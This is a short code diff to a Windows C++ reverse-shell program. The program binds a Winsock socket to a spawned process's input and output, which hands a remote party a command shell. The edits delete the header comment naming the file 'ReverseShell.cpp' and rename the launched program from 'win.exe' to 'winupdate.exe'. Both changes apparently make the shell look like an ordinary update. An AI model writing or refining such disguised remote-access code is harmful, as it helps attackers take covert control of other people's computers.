@@ -1,6 +1,3 @@
-// ReverseShell.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
 
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <winsock2.h>
@@ -17,7 +14,7 @@ STARTUPINFO sui;
 PROCESS_INFORMATION pi;
 
 
-int main(int argc, char **argv)
+void main(void)
 {
 	int err;
 
@@ -38,7 +35,7 @@ int main(int argc, char **argv)
 	sui.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 	sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)Winsock;
 
-	TCHAR command[256] = L"win.exe";
+	TCHAR command[256] = L"winupdate.exe";
 	CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &sui, &pi);
 		
 }
